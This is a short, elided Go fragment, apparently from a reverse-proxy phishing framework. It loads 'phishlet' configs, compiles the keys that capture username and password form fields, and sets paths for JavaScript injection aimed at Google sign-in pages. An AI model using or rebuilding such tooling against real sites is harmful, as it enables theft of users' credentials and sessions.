...
func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[string]string) error {
	...
	p.username.key, err = compileCredentialKey(p.paramVal(*fp.Credentials.Username.Key))
	if err != nil {
	...
	p.password.key, err = compileCredentialKey(p.paramVal(*fp.Credentials.Password.Key))
	if err != nil {
		return fmt.Errorf("credentials: %v", err)
	}
...
// compileJsInjectPath supports exact paths, regex patterns (^/v3/signin/.*), and legacy wildcards.
func compileJsInjectPath(pattern string) (*regexp.Regexp, error) {
...
// compileCredentialKey allows empty key to match any form field (used by Google batchexecute phishlets).
func compileCredentialKey(key string) (*regexp.Regexp, error) {
	if key == "" {
